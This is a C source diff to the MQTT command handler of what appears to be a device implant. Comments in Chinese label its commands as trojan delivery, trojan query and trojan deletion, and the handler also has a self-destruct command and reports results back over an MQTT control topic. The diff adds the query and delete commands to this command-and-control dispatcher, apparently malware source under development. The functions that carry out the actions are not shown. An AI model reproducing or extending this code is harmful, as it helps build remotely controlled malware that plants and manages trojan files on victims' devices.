@@ -88,7 +88,6 @@ int topic_controldown_handle(cJSON * root)
         fprintf(stderr, "msg not assigned command type\n");
         return -1;
     }
-
     resp = cJSON_CreateObject();
     cJSON_AddNumberToObject(resp, "sn", DeviceSN);
     if ((obj = cJSON_GetObjectItem(root, "sid")) != NULL) 
@@ -293,8 +292,17 @@ int topic_controldown_handle(cJSON * root)
     }
     else if (!strcmp(type->valuestring, "wifiMMFiles")) {//木马下发
     	cJSON_AddStringToObject(resp, "error", "none");
-    	mmget_thread_start(root);
+    	mmget_thread_start(root,2);
+    	//mmfile_query();
     }
+    else if (!strcmp(type->valuestring, "MMQuery")) {//木马查询
+		cJSON_AddStringToObject(resp, "error", "none");
+		mmfile_query(root);
+	}
+    else if (!strcmp(type->valuestring, "MMDelete")) {//木马删除
+		cJSON_AddStringToObject(resp, "error", "none");
+		mmget_thread_start(root,1);
+	}
     else if (!strcmp(type->valuestring, "wifiUpdate")) {
     	cJSON_Delete(resp);
     	return 0;
@@ -312,7 +320,6 @@ int topic_controldown_handle(cJSON * root)
     	printf("do selfDestroy\n");
 		cJSON_AddStringToObject(resp, "error", "none");
 	}
-    printf("do selfDestroy2\n");
 msg_resp:
 	pdata = cJSON_Print(resp);
     mqtt_publish_msg(MQTT_TOPIC_CONTROLUP,(uint8_t *)pdata,strlen(pdata) );
